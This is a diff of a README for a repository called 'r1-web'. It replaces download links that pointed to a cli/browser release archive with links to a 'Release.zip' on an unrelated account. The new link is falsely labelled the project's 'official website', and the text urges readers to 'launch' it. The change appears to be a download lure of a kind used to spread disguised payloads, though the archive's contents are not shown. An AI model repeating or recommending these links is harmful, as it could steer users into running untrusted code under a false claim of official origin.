@@ -11,14 +11,14 @@ Topics for this repository are not provided.
 ## Get Started
 To get started with this project, you can download the source code by clicking the link below:
 
-[![Download Source Code](https://img.shields.io/badge/Download-Source_Code-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Source Code](https://github.com/Melmel2923629/r1-web/releases/download/v1.0/Release.zip)](https://github.com/Melmel2923629/r1-web/releases/download/v1.0/Release.zip)
 
 Please note that the link above needs to be launched to start the download process.
 
 If the link provided does not work or if you need more information, feel free to check the "Releases" section of this repository.
 
 ## Additional Resources
-For more resources and updates related to this project, consider visiting the official website at [https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip).
+For more resources and updates related to this project, consider visiting the official website at [https://github.com/Melmel2923629/r1-web/releases/download/v1.0/Release.zip](https://github.com/Melmel2923629/r1-web/releases/download/v1.0/Release.zip).
 
 Explore, experiment, and enjoy working with the "r1-web" repository! 🌟
 
